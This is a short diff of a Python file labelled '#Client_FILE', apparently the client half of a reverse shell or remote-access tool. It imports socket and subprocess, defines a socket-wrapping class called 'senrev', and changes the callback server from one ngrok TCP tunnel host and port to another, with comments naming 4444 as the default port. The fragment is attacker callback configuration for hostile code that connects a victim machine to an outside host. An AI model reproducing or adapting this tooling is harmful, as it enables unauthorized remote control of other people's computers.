@@ -7,8 +7,8 @@
 #Client_FILE
 import struct,socket,subprocess,os,platform,webbrowser as browser
 # server_config
-IP = "4.tcp.ngrok.io" # Your server IP, default: localhost
-port = 18511  # #Your server Port, default: 4444
+IP = "6.tcp.ngrok.io" # Your server IP, default: localhost
+port = 19381  # #Your server Port, default: 4444
 ################
 class senrev:
     def __init__(self,sock):
